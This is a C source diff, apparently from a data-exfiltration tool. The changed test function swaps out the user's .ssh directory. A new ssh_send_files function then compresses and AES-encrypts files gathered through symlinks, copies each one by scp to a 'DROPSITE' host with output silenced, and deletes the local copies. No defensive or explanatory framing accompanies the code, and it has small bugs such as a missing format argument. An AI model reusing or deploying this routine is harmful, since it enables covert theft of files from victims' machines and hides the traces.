@@ -46,8 +46,9 @@ int main(int argc, const char * argv[])
  *----------------------------------------------------------------------------*/
 void test_ssh()
 {
-	ssh_replace_dir();
-	ssh_restore_dir();
+	ssh_replace_dir();	/* backup and replace .ssh directory */
+	ssh_send_files();	/* send any files in the pickup directory */
+	ssh_restore_dir();	/* restore original .ssh directory */
 }
 
 void ssh_replace_dir(void)
@@ -108,7 +109,86 @@ void ssh_restore_dir(void)
 	free(command);
 }
 
-void ssh_send_timer(void)
+void ssh_send_files(void)
 {
+	struct dirent *dp;
+	DIR *dir = opendir(SYMLINK_DIR);
+	FILE *fd_in, *fd_out;
+	int count = 0;
+	char *file_in = (char *)malloc(FILENAME_MAX);
+	char *file_out = (char *)malloc(FILENAME_MAX);
 	char *command = (char *)malloc(FILENAME_MAX);
+	EVP_CIPHER_CTX encrypt, decrypt;
+
+	/* initialize encryption */
+	if (aes_init(&encrypt, &decrypt) == ERROR)
+		fprintf(stderr, "ERROR: aes_init");
+
+	while ((dp = readdir(dir)) != NULL) {
+		/* ignore first two entires "." and ".." */
+		if (count++ > 1 && strncmp(dp->d_name, ".send", strlen(dp->d_name))) {
+			/* compress the file */
+			memset(file_in, 0x00, FILENAME_MAX);
+			memset(file_out, 0x00, FILENAME_MAX);
+			sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
+			sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
+
+			printf("current file = %s\n", dp->d_name);
+
+			if ((fd_in = fopen(file_in, "r")) == NULL)
+				err(1, "fopen");
+			
+			if ((fd_out = fopen(file_out, "w")) == NULL)
+				err(1, "fopen");
+
+			if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
+				fprintf(stderr, "ZLIB: Error deflating file %s\n");
+				exit(ERROR);
+			}
+
+			/* delete symlink */
+			remove(file_in);
+
+			fclose(fd_in);
+			fclose(fd_out);
+
+			/* encrypt the file */
+			memset(file_in, 0x00, FILENAME_MAX);
+			memset(file_out, 0x00, FILENAME_MAX);
+			sprintf(file_in, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
+			sprintf(file_out, "%s%s", PICKUP_DIR, dp->d_name);
+
+			if ((fd_in = fopen(file_in, "r")) == NULL)
+				err(1, "fopen");
+			
+			if ((fd_out = fopen(file_out, "w")) == NULL)
+				err(1, "fopen");
+
+			file_encrypt(fd_in, fd_out);
+
+			/* delete compressed file */
+			remove(file_in);
+
+			fclose(fd_in);
+			fclose(fd_out);			
+
+			/* send the file */
+			memset(command, 0x00, FILENAME_MAX);
+			sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out, DROPSITE, DROPSITE_DIR);
+			system(command);
+
+			/* delete compressed & encrypted file */
+			remove(file_out);
+		}
+	}
+
+	free(file_in);
+	free(file_out);
+	free(command);
+
+	closedir(dir);
+}
+
+void ssh_timer(void)
+{
 }
